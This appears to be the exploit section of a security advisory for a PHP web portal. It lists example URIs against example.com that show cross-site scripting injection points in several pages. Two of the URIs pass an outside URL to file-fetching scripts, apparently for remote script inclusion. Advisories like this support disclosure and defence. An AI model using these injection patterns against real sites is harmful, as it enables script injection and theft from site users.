Attackers can use a browser to exploit the information-disclosure issue. To exploit a cross-site scripting vulnerability, an attacker must entice an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/credits.php?'XSS
http://www.example.com/forum.php?'XSS
http://www.example.com/index.php?'XSS
http://www.example.com/login.php?'XSS
http://www.example.com/online.php?'XSS
http://www.example.com/getfiles.php?f=http://xxx&amp;t=js
http://www.example.com/admin/portalcollect.php?f=http://xxx&amp;t=js
